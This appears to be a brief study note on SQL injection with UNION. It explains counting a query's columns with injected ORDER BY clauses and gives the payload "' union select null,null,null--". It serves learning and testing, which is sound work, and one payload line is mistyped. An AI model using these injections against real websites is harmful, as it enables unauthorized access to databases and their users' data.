# Union Attack and determine the no.of columns

<b>UNION</b> keyword allow us to execute one or more additional <b>SELECT</b> query

example query

```
select a,b from user union select c,d from user1
```

this will return the value of user a and b from the user , so the c and d value will be returned by user1

<h3>Requriments for UNION based attack </h3>

 * Number of columns returned from the original query
 * Suitable data type to hold the results from the injected query
 
<b>ORDER BY</b> is used to determine number of columns by incrementing the specified column index until error occurs , most likely internal server error.

example query

```
' order by 1--
' order by 2--
' order by 3--
```

end goal : to determine number of columns returned by the query

first lets determine the number of columns it has

```
' order 1--
' order 2--
' order 3--
' order 4--  //internal server error
```

so here we have three colummns , now lets make our payload to attack it

payload

```
' union select null,null,null--
```
the reason of using NULL as it can be converted into any commonly used data type 

